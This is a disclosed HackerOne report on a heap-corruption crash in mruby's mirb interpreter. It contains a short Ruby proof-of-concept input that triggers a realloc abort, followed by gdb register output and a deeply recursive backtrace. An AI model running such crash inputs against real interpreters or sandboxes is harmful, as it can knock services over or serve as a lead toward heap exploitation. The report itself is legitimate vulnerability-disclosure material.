# SIGABRT in only mirb

## Report Details
- **Report ID**: 212882
- **URL**: https://hackerone.com/reports/212882
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-12T17:24:03.468Z
- **Disclosed**: 2017-04-27T21:20:01.041Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test.rb):

	def to_str
	``
	00end
	0.times

Debug - mirb
-------------------

	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :to_str
	*** Error in `/home/x/Desktop/test/mruby/bin/mirb': realloc(): invalid next size: 0x0000000000710bb0 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) info reg
	rax            0x0	0
	rbx            0x69	105
	rcx            0xffffffffffffffff	-1
	rdx            0x6	6
	rsi            0x6865	26725
	rdi            0x6865	26725
	rbp            0x7ffffffbfdd0	0x7ffffffbfdd0
	rsp            0x7ffffffbfa38	0x7ffffffbfa38
	r8             0x3062623031373030	3486457020661837872
	r9             0x75726d2f74736574	8462946700367193460
	r10            0x8	8
	r11            0x246	582
	r12            0x7ffffffbfbe0	140737488092128
	r13            0x7	7
	r14            0x69	105
	r15            0x7	7
	rip            0x7ffff7744f79	0x7ffff7744f79 <__GI_raise+57>
	eflags         0x246	[ PF ZF IF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x710ba0, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x710bb0, bytes=16384) at malloc.c:3029
	#6  0x000000000042cbab in mrb_default_allocf (mrb=0x6b0010, p=0x710bb0, size=16384, ud=0x0) at /home/x/Desktop/test/mruby/src/state.c:60
	#7  0x0000000000434df6 in mrb_realloc_simple (mrb=0x6b0010, p=0x710bb0, len=16384) at /home/x/Desktop/test/mruby/src/gc.c:201
	#8  0x0000000000434e78 in mrb_realloc (mrb=0x6b0010, p=0x710bb0, len=16384) at /home/x/Desktop/test/mruby/src/gc.c:215
	#9  0x00000000004063cf in stack_extend_alloc (mrb=0x6b0010, room=7, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:161
	#10 0x00000000004064e3 in stack_extend (mrb=0x6b0010, room=7, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:181
	#11 0x000000000040a180 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5ad0, pc=0x71ec30) at /home/x/Desktop/test/mruby/src/vm.c:1264
	#12 0x00000000004083c5 in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d40, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:820
	#13 0x00000000004105a5 in mrb_run (mrb=0x6b0010, proc=0x6b2d40, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2568
	#14 0x000000000040753a in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:451
	#15 0x00000000004075d9 in mrb_funcall_argv (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0) at /home/x/Desktop/test/mruby/src/vm.c:461
	#16 0x0000000000403774 in convert_type (mrb=0x6b0010, val=..., tname=0x46db1e "String", method=0x46db17 "to_str", raise=0 '\000') at /home/x/Desktop/test/mruby/src/object.c:320
	#17 0x0000000000403983 in mrb_check_convert_type (mrb=0x6b0010, val=..., type=MRB_TT_STRING, tname=0x46db1e "String", method=0x46db17 "to_str") at /home/x/Desktop/test/mruby/src/object.c:356
	#18 0x000000000041977b in mrb_check_string_type (mrb=0x6b0010, str=...) at /home/x/Desktop/test/mruby/src/string.c:1754
	#19 0x0000000000413073 in mrb_f_raise (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/src/kernel.c:862
	#20 0x0000000000409ee2 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5ad0, pc=0x488dc8 <mrblib_irep+15388>) at /home/x/Desktop/test/mruby/src/vm.c:1227
	#21 0x00000000004083c5 in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d40, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:820
	#22 0x00000000004105a5 in mrb_run (mrb=0x6b0010, proc=0x6b2d40, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2568
	#23 0x000000000040753a in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:451
	#24 0x00000000004075d9 in mrb_funcall_argv (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0) at /home/x/Desktop/test/mruby/src/vm.c:461
	#25 0x0000000000403774 in convert_type (mrb=0x6b0010, val=..., tname=0x46db1e "String", method=0x46db17 "to_str", raise=0 '\000') at /home/x/Desktop/test/mruby/src/object.c:320
	#26 0x0000000000403983 in mrb_check_convert_type (mrb=0x6b0010, val=..., type=MRB_TT_STRING, tname=0x46db1e "String", method=0x46db17 "to_str") at /home/x/Desktop/test/mruby/src/object.c:356
	#27 0x000000000041977b in mrb_check_string_type (mrb=0x6b0010, str=...) at /home/x/Desktop/test/mruby/src/string.c:1754
	#28 0x0000000000413073 in mrb_f_raise (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/src/kernel.c:862
	#29 0x0000000000409ee2 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5ad0, pc=0x488dc8 <mrblib_irep+15388>) at /home/x/Desktop/test/mruby/src/vm.c:1227
	#30 0x00000000004083c5 in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d40, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:820
	#31 0x00000000004105a5 in mrb_run (mrb=0x6b0010, proc=0x6b2d40, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2568
	#32 0x000000000040753a in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:451
	#33 0x00000000004075d9 in mrb_funcall_argv (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0) at /home/x/Desktop/test/mruby/src/vm.c:461
	#34 0x0000000000403774 in convert_type (mrb=0x6b0010, val=..., tname=0x46db1e "String", method=0x46db17 "to_str", raise=0 '\000') at /home/x/Desktop/test/mruby/src/object.c:320
	#35 0x0000000000403983 in mrb_check_convert_type (mrb=0x6b0010, val=..., type=MRB_TT_STRING, tname=0x46db1e "String", method=0x46db17 "to_str") at /home/x/Desktop/test/mruby/src/object.c:356
	#36 0x000000000041977b in mrb_check_string_type (mrb=0x6b0010, str=...) at /home/x/Desktop/test/mruby/src/string.c:1754
	#37 0x0000000000413073 in mrb_f_raise (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/src/kernel.c:862
	#38 0x0000000000409ee2 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5ad0, pc=0x488dc8 <mrblib_irep+15388>) at /home/x/Desktop/test/mruby/src/vm.c:1227
	#39 0x00000000004083c5 in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d40, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:820
	#40 0x00000000004105a5 in mrb_run (mrb=0x6b0010, proc=0x6b2d40, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2568
	#41 0x000000000040753a in mrb_funcall_with_block (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0, blk=...) at /home/x/Desktop/test/mruby/src/vm.c:451
	#42 0x00000000004075d9 in mrb_funcall_argv (mrb=0x6b0010, self=..., mid=144, argc=0, argv=0x0) at /home/x/Desktop/test/mruby/src/vm.c:461
	#43 0x0000000000403774 in convert_type (mrb=0x6b0010, val=..., tname=0x46db1e "String", method=0x46db17 "to_str", raise=0 '\000') at /home/x/Desktop/test/mruby/src/object.c:320
	#44 0x0000000000403983 in mrb_check_convert_type (mrb=0x6b0010, val=..., type=MRB_TT_STRING, tname=0x46db1e "String", method=0x46db17 "to_str") at /home/x/Desktop/test/mruby/src/object.c:356
	#45 0x000000000041977b in mrb_check_string_type (mrb=0x6b0010, str=...) at /home/x/Desktop/test/mruby/src/string.c:1754
	#46 0x0000000000413073 in mrb_f_raise (mrb=0x6b0010, self=...) at /home/x/Desktop/test/mruby/src/kernel.c:862
	#47 0x0000000000409ee2 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b5ad0, pc=0x488dc8 <mrblib_irep+15388>) at /home/x/Desktop/test/mruby/src/vm.c:1227
	#48 0x00000000004083c5 in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d40, self=..., stack_keep=2) at /home/x/Desktop/test/mruby/src/vm.c:820
	#49 0x00000000004105a5 in mrb_run (mrb=0x6b0010, proc=0x6b2d40, self=...) at /home/x/Desktop/test/mruby/src/vm.c:2568
	---Type <return> to continue, or q <return> to quit---q
	Quit

## Attachments
- test.rb
